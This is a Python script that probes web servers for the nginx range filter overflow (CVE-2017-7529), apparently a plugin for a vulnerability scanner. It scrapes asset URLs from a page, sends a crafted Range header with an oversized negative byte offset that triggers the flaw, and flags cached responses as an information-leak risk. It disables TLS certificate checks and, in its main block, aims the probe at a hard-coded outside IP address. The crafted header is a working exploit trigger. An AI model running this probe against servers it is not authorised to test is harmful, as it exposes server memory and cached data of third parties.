# coding=utf-8
import requests
import re
import urllib.parse as urlparse
import html as hhhhwj
import ssl

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context


def get_url(protocol,domain,timeout):
    url_list = []
    surl = protocol + '://' + domain
    res = requests.get(surl,verify=False,timeout=timeout)
    url_list.append(surl)
    html = res.text
    root_url = res.url
    m = re.findall("<(?:img|link|script)[^>]*?(?:src|href)=('|\")(.*?)\\1", html, re.I)
    if m:
        for url in m:
            ParseResult = urlparse.urlparse(url[1])
            if ParseResult.netloc and ParseResult.scheme:
                if domain == ParseResult.hostname:
                    url_list.append(hhhhwj.unescape(url[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(hhhhwj.unescape(urlparse.urljoin(root_url, url[1])))
    return list(set(url_list))

def verify(protocol,ip,port):
    oldurl = protocol+'://'+ip+':'+str(port)
    print('testing if nginx range filter vul')
    timeout = 5
    i = 0
    try:
        url_list = get_url(protocol,ip + ":" + str(port),timeout)
        for url in url_list:
            if i >=3:
                break;
            i += 1
            headers = requests.get(url,verify=False,timeout=timeout).headers
            file_len = headers["Content-Length"]
            headers['Range'] =  "bytes=-%d,-9223372036854%d"%(int(file_len)+623,776000-(int(file_len)+623))
            cacheres = requests.get(url, headers=headers,verify=False,timeout=timeout)
            if cacheres.status_code == 206 and "Content-Range" in cacheres.text:
                msg = 'There is nginx range filter vul(cve-2017-7529) in url:'+url+' .'
                if ": HIT" in cacheres.headers:
                    msg = msg + 'And open the cache function, there is information leakage risk'
                else:
                    pass
                print(msg)
                number = 'v48'
                return True,url,number,msg
            else:
                pass
        msg = 'There is no nginx range filter vul on url: '+oldurl+' .'
        number = 'v0'
        return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,oldurl,number,msg

if __name__ == '__main__':
    res = verify('http','146.196.114.106',80)
    print(res)